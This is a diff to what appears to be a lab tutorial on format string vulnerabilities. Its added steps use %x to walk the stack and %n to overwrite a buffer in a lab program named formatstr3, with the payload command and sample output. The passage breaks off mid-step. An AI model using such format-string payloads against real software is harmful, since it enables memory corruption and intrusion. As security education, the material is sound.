@@ -142,4 +142,19 @@ address of buffer ffffcc26
 buffer Goodbye
 ```
 
-6. Change the bnu
+6. Change the number of `%x` so that the address of the buffer is the last word to be displayed
+7. Change the last `%x` to `%n` so that instead of `%x` which will display the current word in the stack, `%n` will write something to the address contained in the current word of the stack
+```
+./formatstr3 %x.%x.%x.%x.%x.%n
+```
+8. You may get the following output:
+```
+address of buffer bfc8a902
+buffer Goodbye
+0.ffffc934.0.ffffcc30.401126.
+address of buffer bfc8a902
+buffer
+```
+
+9. We have changed the variable buffer to an empty string
+10. To change the buffer 
